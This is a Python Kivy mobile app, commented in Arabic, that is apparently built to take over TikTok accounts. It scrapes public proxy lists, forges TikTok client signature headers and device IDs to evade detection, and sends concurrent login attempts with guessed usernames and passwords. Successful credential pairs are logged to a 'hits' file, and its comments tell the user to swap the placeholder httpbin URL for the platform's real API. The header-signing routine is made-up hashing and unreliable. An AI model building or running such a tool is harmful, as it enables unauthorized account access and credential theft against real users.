import asyncio
import threading
import random
import time
import hashlib
import aiohttp
import aiofiles
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.core.window import Window

# --- [ إعدادات النخبة ] ---
CONFIG = {
    "target_url": "https://httpbin.org/post", # ⚠️ استبدله برابط الـ API الحقيقي للمنصة
    "user_file": "targets.txt",
    "success_file": "real_hits.txt",
    "proxy_sources": [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    ]
}

SUCCESS_KEYS = ["session", "token", "uid", "login_success"]
FAILURE_KEYS = ["error", "wrong", "captcha", "challenge", "verify"]

# --- [ المحرك البرمجي الخلفي ] ---
class ArchitectEngine:
    def __init__(self):
        self.stats = {"total": 0, "success": 0, "failed": 0, "proxies": []}
        self.is_running = False
        self.logs = []

    def get_dynamic_signature(self, payload):
        stub = hashlib.md5(str(payload).encode()).hexdigest()
        ts = int(time.time())
        argus = hashlib.sha1(f"{stub}{ts}v12".encode()).hexdigest()
        ladon = hashlib.md5(f"ladon_{ts}_{stub}".encode()).hexdigest()
        return argus, ladon, stub, ts

    def get_headers(self, payload):
        argus, ladon, stub, ts = self.get_dynamic_signature(payload)
        return {
            "User-Agent": "TikTok 33.1.4 (iPhone; iOS 17.4) Cronet",
            "X-SS-STUB": stub, "X-Argus": argus, "X-Ladon": ladon,
            "X-Khronos": str(ts), "X-Device-ID": f"73{random.getrandbits(48)}",
            "Content-Type": "application/json; charset=utf-8"
        }

    async def update_proxies(self):
        async with aiohttp.ClientSession() as session:
            all_p = []
            for url in CONFIG["proxy_sources"]:
                try:
                    async with session.get(url, timeout=5) as r:
                        if r.status == 200:
                            text = await r.text()
                            all_p.extend([f"http://{p.strip()}" for p in text.splitlines() if ":" in p])
                except: continue
            self.stats["proxies"] = list(set(all_p))[:500]

    async def attack_unit(self, session):
        if not self.stats["proxies"]: return
        
        # اختيار مستخدم عشوائي (محاكاة الحقن)
        user = f"user_{random.randint(1000, 9999)}" 
        password = f"{user}123"
        payload = {"username": user, "password": password}
        
        proxy = random.choice(self.stats["proxies"])
        headers = self.get_headers(payload)

        try:
            async with session.post(CONFIG["target_url"], json=payload, headers=headers, proxy=proxy, timeout=10) as resp:
                body = (await resp.text()).lower()
                if resp.status == 200 and any(k in body for k in SUCCESS_KEYS):
                    self.stats["success"] += 1
                    async with aiofiles.open(CONFIG["success_file"], mode='a') as f:
                        await f.write(f"HIT: {user}:{password}\n")
                else:
                    self.stats["failed"] += 1
                self.stats["total"] += 1
        except:
            self.stats["failed"] += 1

    async def main_loop(self, ui_callback):
        await self.update_proxies()
        async with aiohttp.ClientSession() as session:
            while self.is_running:
                tasks = [self.attack_unit(session) for _ in range(10)]
                await asyncio.gather(*tasks)
                ui_callback(self.stats)
                await asyncio.sleep(0.1)

# --- [ واجهة المستخدم Kivy الرسومية ] ---
class MainInterface(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', padding=15, spacing=10, **kwargs)
        self.engine = ArchitectEngine()
        
        # شعار النظام
        self.add_widget(Label(text="ARCHITECT MOBILE v12.0", font_size='24sp', color=(0, 1, 0, 1), size_hint_y=0.1))
        
        # شريط التحميل (Splash Simulation)
        self.progress = ProgressBar(max=100, value=0, size_hint_y=None, height=10)
        self.add_widget(self.progress)

        # العدادات
        self.stats_label = Label(text="العمليات: 0 | النجاح: 0 | الفشل: 0", font_size='16sp', size_hint_y=0.1)
        self.add_widget(self.stats_label)

        self.proxy_label = Label(text="البروكسيات: جاري الفحص...", color=(0, 0.7, 1, 1), size_hint_y=0.05)
        self.add_widget(self.proxy_label)

        # منطقة السجلات
        self.scroll = ScrollView(size_hint=(1, 0.5))
        self.log_box = Label(text="[+] النظام قيد التشغيل...\n", size_hint_y=None, height=1000, halign='left', valign='top')
        self.log_box.bind(size=lambda s, w: setattr(self.log_box, 'text_size', (self.log_box.width, None)))
        self.scroll.add_widget(self.log_box)
        self.add_widget(self.scroll)

        # أزرار التحكم
        self.btn_launch = Button(text="إطلاق النظام", background_color=(0, 0.6, 0, 1), size_hint_y=0.15, font_size='20sp')
        self.btn_launch.bind(on_press=self.toggle_engine)
        self.add_widget(self.btn_launch)

        Clock.schedule_interval(self.update_progress, 0.05)

    def update_progress(self, dt):
        if self.progress.value < 100:
            self.progress.value += 1
            return True
        return False

    def toggle_engine(self, instance):
        if not self.engine.is_running:
            self.engine.is_running = True
            self.btn_launch.text = "إيقاف العمليات"
            self.btn_launch.background_color = (0.7, 0, 0, 1)
            threading.Thread(target=self.start_async_thread, daemon=True).start()
        else:
            self.engine.is_running = False
            self.btn_launch.text = "إعادة الإطلاق"
            self.btn_launch.background_color = (0, 0.6, 0, 1)

    def start_async_thread(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.engine.main_loop(self.refresh_ui))

    def refresh_ui(self, stats):
        Clock.schedule_once(lambda dt: self._update_labels(stats))

    def _update_labels(self, stats):
        self.stats_label.text = f"العمليات: {stats['total']} | النجاح: {stats['success']} | الفشل: {stats['failed']}"
        self.proxy_label.text = f"البروكسيات النشطة: {len(stats['proxies'])}"
        if stats['success'] > 0:
            self.log_box.text = f"[!] تم صيد حساب جديد: {time.ctime()}\n" + self.log_box.text

class ArchitectApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0, 1) # خلفية سوداء ملكية
        return MainInterface()

if __name__ == "__main__":
    ArchitectApp().run()
